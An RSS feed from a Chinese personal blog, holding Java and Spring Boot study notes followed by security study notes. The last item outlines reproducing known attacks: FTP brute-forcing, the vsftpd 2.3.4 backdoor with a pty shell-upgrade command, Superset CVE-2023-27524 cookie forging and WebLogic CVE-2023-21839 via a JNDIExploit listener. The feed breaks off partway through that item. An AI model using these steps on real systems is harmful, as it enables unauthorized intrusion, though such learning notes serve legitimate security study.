<?xml version="1.0"?>
<rss version="2.0">
    <channel>
        <title>Vegetable Blog</title>
        <subtitle>永远在学习的路上</subtitle>
        <icon>http://ericcd.com/images/favicon.ico</icon>
        <link>http://ericcd.com</link>
        <author>
          <name>EricCD</name>
        </author>
        <description></description>
        <language>zh-CN</language>
        <pubDate>Thu, 25 Jan 2024 10:43:21 +0800</pubDate>
        <lastBuildDate>Thu, 25 Jan 2024 10:43:21 +0800</lastBuildDate>
        <item>
            <guid isPermalink="true">http://ericcd.com/2024/01/25/backend/java/</guid>
            <title>java 基础</title>
            <link>http://ericcd.com/2024/01/25/backend/java/</link>
            <category term="后端开发" scheme="http://ericcd.com/categories/backend/" />
            <pubDate>Thu, 25 Jan 2024 10:43:21 +0800</pubDate>
            <description><![CDATA[ &lt;p&gt;java 相关知识&lt;br /&gt;
&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;&lt;/p&gt;
&lt;h1 id=&#34;常用-api&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#常用-api&#34;&gt;#&lt;/a&gt; 常用 API&lt;/h1&gt;
&lt;h2 id=&#34;string&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#string&#34;&gt;#&lt;/a&gt; String&lt;/h2&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;String s1 = &amp;quot;test1&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;s1.charAt (1);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;s1.toCharArray ();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;String s2 = &amp;quot;test2&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;s1.equals (s2);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;s1.equalsIgnoreCase (s2);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;s1.substring (0,2);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;s1.substring (1);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;s1.replace (&amp;quot;te&amp;quot;, &amp;quot;et&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;s1.contains (&amp;quot;et&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;s1.startsWith (&amp;quot;et&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;s1.split (&amp;quot; &amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h2 id=&#34;arraylist&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#arraylist&#34;&gt;#&lt;/a&gt; ArrayList&lt;/h2&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;ArrayList list = new ArrayList ();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;list.add (&amp;quot;1&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;list.add (&amp;quot;a&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ArrayList&amp;lt;String&amp;gt; slist = new ArrayList ();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;slist.add (&amp;quot;a&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;list.add (1,&amp;quot;b&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;list.get (1);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;list.size ();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;list.remove (1);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;list.remove (&amp;quot;b&amp;quot;);// 默认删除第一次出现的数据 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;list.set (1,&amp;quot;c&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">http://ericcd.com/2024/01/24/backend/SpringBoot3andVue3/</guid>
            <title>SpringBoot3+Vue3</title>
            <link>http://ericcd.com/2024/01/24/backend/SpringBoot3andVue3/</link>
            <category term="后端开发" scheme="http://ericcd.com/categories/backend/" />
            <pubDate>Wed, 24 Jan 2024 19:41:35 +0800</pubDate>
            <description><![CDATA[ &lt;p&gt;黑马程序员笔记&lt;br /&gt;
&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;&lt;/p&gt;
&lt;h1 id=&#34;基础&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#基础&#34;&gt;#&lt;/a&gt; 基础&lt;/h1&gt;
&lt;h2 id=&#34;springboot-基础&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#springboot-基础&#34;&gt;#&lt;/a&gt; SpringBoot 基础&lt;/h2&gt;
&lt;h3 id=&#34;配置文件&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#配置文件&#34;&gt;#&lt;/a&gt; 配置文件&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;properties 文件&lt;/li&gt;
&lt;li&gt;yml 文件&lt;br /&gt;
 a. 使用 @Value (&amp;quot;${键名}&amp;quot;) 获取配置信息&lt;br /&gt;
 b. 使用 @ConfigurationProperties (prefix = &amp;quot;&amp;quot;) 获取配置信息&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;配置-mybatis&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#配置-mybatis&#34;&gt;#&lt;/a&gt; 配置 Mybatis&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;controller -&amp;gt; service -&amp;gt; mapper&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;bean-管理&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#bean-管理&#34;&gt;#&lt;/a&gt; Bean 管理&lt;/h3&gt;
&lt;h4 id=&#34;bean-扫描&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#bean-扫描&#34;&gt;#&lt;/a&gt; Bean 扫描&lt;/h4&gt;
&lt;ol&gt;
&lt;li&gt;启动类下的 @ComponentScan 默认扫描所处包下的标签。&lt;/li&gt;
&lt;/ol&gt;
&lt;h4 id=&#34;bean-注册&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#bean-注册&#34;&gt;#&lt;/a&gt; Bean 注册&lt;/h4&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;如果注册的 bean 对象来自第三方，便无法使用 @Component 及其衍生注解声明 bean&lt;br /&gt;
 使用 @Bean 和 @Import。&lt;br /&gt;
a. @Bean&lt;br /&gt;
@Bean 自动将声明方法的返回结果注入容器，建议在配置类中集中创建。通常对象默认的名字是方法名。&lt;br /&gt;
如果方法内部需要使用到容器中已经存在的 bean 对象，那么只需要在方法参数中声明即可。&lt;/p&gt;
&lt;p&gt;b. @Import&lt;br /&gt;
@Import (***.class) 或者导入 ImportSelector 接口实现类。使用自定义注解批量创建。&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;public class CommonImportSelector implements ImportSelector&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  public String [] selectImports (AnnotationMetadata importingClassMetadata)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    List&amp;lt;String&amp;gt; imports = new ArrayList&amp;lt;&amp;gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    InputStream is = CommonImportSelector.class.getClassLoader ().getResourceAsStream (&amp;quot;&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    String line = null;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    while ((line = br.readLine ()) !=null )&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    imports.add (line);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  br.close ();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  return imports.toArray (new String [0]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h4 id=&#34;注册条件&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#注册条件&#34;&gt;#&lt;/a&gt; 注册条件&lt;/h4&gt;
&lt;p&gt;使用 @Conditional 及其衍生注解设置注册生效条件。&lt;/p&gt;
&lt;h3 id=&#34;自动配置原理&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#自动配置原理&#34;&gt;#&lt;/a&gt; 自动配置原理&lt;/h3&gt;
&lt;p&gt;@EnableAutoConfiguration&lt;br /&gt;
@AutoConfigurationImportSelector&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;提供配置类：CommonConfig&lt;/li&gt;
&lt;li&gt;提供自动配置类：@AutoConfiguration 和 @Inport (CommonConfig.class)&lt;/li&gt;
&lt;li&gt;自动配置类的类名添加到配置文件&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;自定义-starter&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#自定义-starter&#34;&gt;#&lt;/a&gt; 自定义 starter&lt;/h3&gt;
&lt;p&gt;autoconfigure 模块和 starter 模块&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;autoconfigure 模块：提供自动配置功能（@AutoConfiguration），自定义配置文件 META-INF/spring/xxx,imports。&lt;/li&gt;
&lt;li&gt;starter 模块：在 pom 中引入自动配置模块。&lt;/li&gt;
&lt;/ol&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">http://ericcd.com/2023/08/08/backend/SpringBoot/</guid>
            <title>SpringBoot</title>
            <link>http://ericcd.com/2023/08/08/backend/SpringBoot/</link>
            <category term="后端开发" scheme="http://ericcd.com/categories/backend/" />
            <pubDate>Tue, 08 Aug 2023 14:42:56 +0800</pubDate>
            <description><![CDATA[ &lt;p&gt;记录一下后端开发过程中学到的知识&lt;br /&gt;
&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;&lt;/p&gt;
&lt;h1 id=&#34;事件发送与监听&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#事件发送与监听&#34;&gt;#&lt;/a&gt; 事件发送与监听&lt;/h1&gt;
&lt;ol&gt;
&lt;li&gt;首先需要自定义事件类，如下所示:&lt;br /&gt;
、、、&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;public class CustomEvent extends ApplicationEvent {&lt;br /&gt;
private String a;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;public CustomEvent (Object source, String a)&amp;#123;
    super (source);
    this.a = a;
&amp;#125;

public String getA ()&amp;#123;
    return a;
&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;}&lt;br /&gt;
、、、&lt;/p&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;
&lt;p&gt;之后编写用于推送事件的 Service&lt;br /&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;@Service&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;public class EventPublisherService implements ApplicationEventPublisherAware&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   private ApplicationEventPublisher eventPublisher;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   @Override&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   public void setApplicationEventPublisher (ApplicationEventpublisher applicaitonEventPublisher)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;       this.eventPublisher = applicationEventPublisher;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   public void publishPlayEvent (String a)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;       CustomEvent customEvent = new CustomEvent (this, a);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;       eventPublisher.publishEvent (customEvent);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;最后编写监听器来实现操作:&lt;br /&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;@EventListener&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;public void handleChannelEvent (CustomEvent customEvent)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   String a= customEvent.a;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   log.info (a);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">http://ericcd.com/2023/06/26/cybersecurity/web-vx/</guid>
            <title>web 杂学</title>
            <link>http://ericcd.com/2023/06/26/cybersecurity/web-vx/</link>
            <category term="网络安全" scheme="http://ericcd.com/categories/cybersecurity/" />
            <pubDate>Mon, 26 Jun 2023 11:16:13 +0800</pubDate>
            <description><![CDATA[ &lt;p&gt;记录从公众号看到的 web 杂学。&lt;br /&gt;
&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;&lt;/p&gt;
&lt;h1 id=&#34;net-反序列化漏洞&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#net-反序列化漏洞&#34;&gt;#&lt;/a&gt; .net 反序列化漏洞&lt;/h1&gt;
&lt;ol&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3huLS0zZHMuTkVU&#34;&gt;在.NET&lt;/span&gt; 处理 Ajax 应用的时候，通常序列化功能由 JavaSerializer 类提供，它是.NET2.0 之后内部实现的序列化功能的类，位于命名空间 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL1N5c3RlbS5XZWI=&#34;&gt;System.Web&lt;/span&gt;..Serialization、通过 System.Web.Extensions 引用，&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3huLS1vb3I4NHBnMGNyMmxiMHBlb3I2dHN3NWcuTmV0&#34;&gt;让开发者轻松实现.Net&lt;/span&gt; 中所有类型和 Json 数据之间的转换，但在某些场景下开发者使用 Deserialize 或 DeserializeObject 方法处理不安全的 Json 数据时会造成反序列化攻击从而实现远程 RCE 漏洞。&lt;/li&gt;
&lt;li&gt;X-Ajaxpro-Method：用于指定在 Ajax 请求中要调用的服务器端方法的名称&lt;/li&gt;
&lt;/ol&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">http://ericcd.com/2023/05/06/cybersecurity/socket/</guid>
            <title>常见漏洞</title>
            <link>http://ericcd.com/2023/05/06/cybersecurity/socket/</link>
            <category term="网络安全" scheme="http://ericcd.com/categories/cybersecurity/" />
            <pubDate>Sat, 06 May 2023 14:26:13 +0800</pubDate>
            <description><![CDATA[ &lt;p&gt;一些组件对应的常见漏洞&lt;br /&gt;
&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;&lt;/p&gt;
&lt;h1 id=&#34;ftp-协议&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#ftp-协议&#34;&gt;#&lt;/a&gt; FTP 协议&lt;/h1&gt;
&lt;h2 id=&#34;基础爆破&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#基础爆破&#34;&gt;#&lt;/a&gt; 基础爆破&lt;/h2&gt;
&lt;p&gt;可以使用 msf 中的 ftp 模块爆破。&lt;/p&gt;
&lt;h2 id=&#34;ftp-匿名访问&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#ftp-匿名访问&#34;&gt;#&lt;/a&gt; ftp 匿名访问&lt;/h2&gt;
&lt;p&gt;用户名：anonymous 密码：为空或者任意邮箱&lt;/p&gt;
&lt;h2 id=&#34;vsftpd234-笑脸漏洞&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#vsftpd234-笑脸漏洞&#34;&gt;#&lt;/a&gt; vsftpd2.3.4 笑脸漏洞&lt;/h2&gt;
&lt;p&gt;在 vsftpd 2.3.4 版本中，在登录输入用户名时输入 😃 类似于笑脸的符号，会导致服务处理开启 6200 后门端口，直接执行系统命令。攻击者可以使用 Metasploit 或 nc 连接后门端口利用。&lt;/p&gt;
&lt;p&gt;使用以下命令可以优化伪终端：&lt;br /&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;python –c “import pty;pty.spawn (‘/bin/bash’)”&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h1 id=&#34;apache&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#apache&#34;&gt;#&lt;/a&gt; Apache&lt;/h1&gt;
&lt;h2 id=&#34;cve-2023-27524&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#cve-2023-27524&#34;&gt;#&lt;/a&gt; CVE-2023-27524&lt;/h2&gt;
&lt;h3 id=&#34;简介&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#简介&#34;&gt;#&lt;/a&gt; 简介&lt;/h3&gt;
&lt;p&gt;Apache Superset 2.0.1 版本及之前版本存在安全漏洞。&lt;br /&gt;
该漏洞存在于 Apache Superset 中，是一个身份认证绕过漏洞。由于 Apache Superset 不安全的默认配置，未根据安装说明更改默认 SECRET_KEY 的系统受此漏洞影响，未经身份认证的远程攻击者利用此漏洞可以访问未经授权的资源或执行恶意代码。该漏洞的危害包括但不限于敏感数据窃取、任意代码执行等。&lt;/p&gt;
&lt;h3 id=&#34;复现&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#复现&#34;&gt;#&lt;/a&gt; 复现&lt;/h3&gt;
&lt;p&gt;通过以下仓库获取利用文件&lt;br /&gt;
 &lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;https://github.com/horizon3ai/CVE-2023-27524&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;br /&gt;
 程序会返回一个 cookie 值，使用该 cookie 值替换自己的登录数据包 cookie，可以登录管理后台。&lt;/p&gt;
&lt;h1 id=&#34;weblogic&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#weblogic&#34;&gt;#&lt;/a&gt; Weblogic&lt;/h1&gt;
&lt;h2 id=&#34;cve-2023-21839&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#cve-2023-21839&#34;&gt;#&lt;/a&gt; CVE-2023-21839&lt;/h2&gt;
&lt;h3 id=&#34;简介-2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#简介-2&#34;&gt;#&lt;/a&gt; 简介&lt;/h3&gt;
&lt;p&gt;由于 Weblogic IIOP/T3 协议存在缺陷，当 IIOP/T3 协议开启时，允许未经身份验证的攻击者通过 IIOP/T3 协议网络访问攻击存在安全风险的 WebLogic Server，漏洞利用成功 WebLogic Server 可能被攻击者接管执行任意命令导致服务器沦陷或者造成严重的敏感数据泄露。&lt;/p&gt;
&lt;h3 id=&#34;复现-2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#复现-2&#34;&gt;#&lt;/a&gt; 复现&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;从以下仓库下载 JNDIExploit&lt;br /&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;https://github.com/WhiteHSBG/JNDIExploit&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;开启 jdni 监听&lt;br /&gt;
 &lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;java -jar JNDIExploit-1.2-SNAPSHOT.jar -i xx.xx.xx.xx&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;br /&gt;
 使用 nc 监听端口&lt;br /&gt;
